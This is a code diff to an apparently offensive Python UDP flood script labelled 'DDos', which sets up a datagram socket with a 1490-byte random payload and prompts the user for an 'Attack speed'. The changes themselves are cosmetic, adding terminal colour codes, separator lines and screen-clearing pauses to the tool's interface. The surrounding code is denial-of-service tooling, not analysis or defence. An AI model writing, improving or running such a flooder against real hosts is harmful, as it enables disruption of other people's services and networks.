@@ -14,11 +14,18 @@ day = now.day
 month = now.month
 year = now.year
 
+#Colour
+yellow='\033[93m'
+gren='\033[92m'
+cyan='\033[96m'
+pink='\033[95m'
+red='\033[91m'
+b='\033[1m'
 ##############
+###################################################################################
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
-#############
-
+###################################################################################
 os.system("clear")
 os.system("figlet DDos")
 print("""\033[94m
@@ -40,6 +47,9 @@ speed = input("\033[94m╠═══\033[91m[ Attack speed (0-1000) ] •\n\033[9
 print("\033[94m")
 os.system("clear")
 os.system("figlet Attack")
+time.sleep(2)
+os.system("clear")
+print()
 print( "[                    ] 0% ")
 time.sleep(2)
 os.system("clear")
